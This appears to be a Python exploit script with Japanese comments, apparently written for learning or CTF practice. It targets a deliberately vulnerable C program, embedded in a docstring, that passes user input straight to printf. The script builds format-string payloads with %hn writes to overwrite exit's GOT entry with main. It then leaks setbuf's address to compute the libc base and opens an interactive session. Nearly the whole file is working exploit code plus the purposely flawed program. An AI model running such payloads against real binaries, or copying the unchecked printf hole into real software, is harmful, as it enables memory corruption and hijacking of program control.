"""
書式文字列攻撃

userがprintfの書式を自由に設定できる場合、攻撃が可能
printf(buf);
"""



from ptrlib import *


def split_byte(value:int, interval:int) -> list:
    bytes_ = value.to_bytes(8, byteorder='little')
    chunks = [bytes_[i:i+interval] for i in range(0, 8, interval)]
    return chunks


def show_memory_chunk(chunks:list):
    for i, chunk in enumerate(chunks):
        print(f"[0x{int.from_bytes(chunk, 'little'):02x}]", end="")
    print()


def show_text(s:str):
    for i,j in enumerate(range(0, len(s), 8)):
        print(i + 6, s[j:j+8])

# 書式文字列攻撃を行う関数
def fsb_unit(func_addr:int , got_target_addr: int) -> bytes:
    #func_addr = elf.symbol("main")
    #got_target_addr = elf.got("exit")

    chunks = split_byte(func_addr, 1)

    chunk1: int = int(chunks[1][0]) * 0x100 + int(chunks[0][0])
    chunk2: int = int(chunks[3][0]) * 0x100 + int(chunks[2][0])

    print(
            "chunk1: ", f"[0x{chunk1:04x}]", f"{chunk1}\n"
            "chunk2: ", f"[0x{chunk2:04x}]", f"{chunk2}"
    )

    delta = chunk1 - chunk2
    format_string = f'%{str(chunk2)}c%11$hn'
    format_string += f'%{str(delta)}c%10$hn'
    format_string += "p" * (8 - len(format_string) % 8) # 詰物
    format_string += "pppppppp" # 計算のめんどくささを軽減する

    payload = format_string.encode("ascii")
    payload += p64(got_target_addr)
    payload += p64(got_target_addr + 2)
    return payload

def main():
    """

    以下をプロンプトに貼り付け実行バイナリをビルドする
```bash
<< EOF cat | gcc -no-pie -z lazy -o chall_vulnfunc -x c -
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void) {
    char buf[0x30] = {};

    setbuf (stdout, NULL);

    puts("Input message");
    read (STDIN_FILENO, buf, sizeof(buf));
    printf(buf);
    exit (0);
}
// gcc chall_vulnfunc.c -no-pie -z lazy -o chall_vulnfunc
EOF
uv run fsb.py
```

    """
    elf = ELF("./chall_vulnfunc")
    proc = Process("./chall_vulnfunc")
    libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6") # ldd chall_vulnfunc

    addr_main = elf.symbol("main")
    addr_exit = elf.got("exit")

    payload = fsb_unit(addr_main, addr_exit)

    show_text(payload)
    proc.sendafter("Input message", payload) # mainを何度も呼び出せるようにするやつ

    addr_setbuf_got = elf.got("setbuf")
    payload = b"%7$sPPPP"
    payload+= p64(addr_setbuf_got)

    proc.sendafter("Input message", payload)
    proc.recv(1)
    leaked = proc.recv(6)  # マーカーまで受け取る
    leaked_setbuf = int.from_bytes(leaked, byteorder='little') # 実際にリークされたアドレス
    # readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep ' setbuf@@GLIBC'
    offset_setbuf = libc_elf.symbol("setbuf")
    # 上で調べたオフセット
    libc_elf.base = leaked_setbuf - offset_setbuf

    # print("leaked_setbuf", )
    print("leaked_setbuf", hex(leaked_setbuf))
    print("setbuf offset", hex(offset_setbuf))
    #print("libc_base    ", hex(libc_base))
    print("leak raw:", leaked, hex(leaked_setbuf))
    proc.interactive()
    return


if __name__ == "__main__":
    main()

